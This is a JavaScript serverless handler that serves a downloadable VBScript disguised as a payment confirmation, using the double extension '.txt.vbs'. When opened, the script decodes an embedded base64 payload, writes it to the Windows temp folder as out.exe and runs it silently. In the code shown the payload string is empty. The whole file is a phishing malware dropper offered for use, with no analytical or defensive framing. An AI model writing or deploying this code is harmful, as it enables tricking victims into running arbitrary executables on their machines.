exports.handler = async (event) => {
  const token = event.queryStringParameters.token || "unknown";
  const filename = `Payment_Confirmation_${token}.txt.vbs`;

  const vbs = `Dim EncPayload, fso, shell, tempPath, exePath, xml, stream

EncPayload = ""

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
exePath = tempPath & "\out.exe"

Set xml = CreateObject("Microsoft.XMLDOM").createElement("b64")
xml.DataType = "bin.base64"
xml.Text = EncPayload

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write xml.nodeTypedValue
stream.SaveToFile exePath, 2
stream.Close

shell.Run "cmd /c """ & exePath & """", 0, False
`;

  return {
    statusCode: 200,
    headers: {
      "Content-Type": "application/octet-stream",
      "Content-Disposition": `attachment; filename=${filename}`,
    },
    body: Buffer.from(vbs).toString("base64"),
    isBase64Encoded: true,
  };
};
